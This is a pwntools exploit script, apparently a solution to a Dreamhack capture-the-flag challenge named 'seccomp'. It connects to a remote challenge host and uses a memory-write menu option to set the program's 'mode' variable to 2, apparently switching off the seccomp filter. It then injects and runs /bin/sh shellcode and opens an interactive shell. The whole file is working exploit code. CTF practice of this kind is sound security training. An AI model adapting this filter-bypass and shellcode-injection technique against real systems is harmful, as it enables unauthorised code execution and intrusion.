#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

#p = process("./seccomp")
p=remote("host3.dreamhack.games", 13576)
elf = ELF("./seccomp", checksec=False)

def write_address(addr, value):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"addr: ", str(addr).encode())
    p.sendlineafter(b"value: ", str(value).encode())

def read_shellcode(shellcode):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"shellcode: ", shellcode)

def execute_shellcode():
    p.sendlineafter(b"> ", b"2")

write_address(elf.symbols["mode"], 2)
read_shellcode(asm(shellcraft.sh()))
execute_shellcode()

p.interactive()
